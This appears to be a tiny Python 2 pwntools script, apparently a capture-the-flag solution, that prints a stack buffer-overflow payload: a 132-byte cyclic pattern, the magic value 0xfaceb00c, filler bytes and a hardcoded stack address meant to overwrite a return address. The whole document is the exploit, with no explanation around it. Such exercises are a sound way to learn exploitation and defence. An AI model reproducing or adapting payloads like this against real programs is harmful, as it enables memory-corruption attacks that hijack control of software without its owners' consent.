from pwn import *

print cyclic(132) + p32(0xfaceb00c) + "FFFF"+p32(0xffffd612)
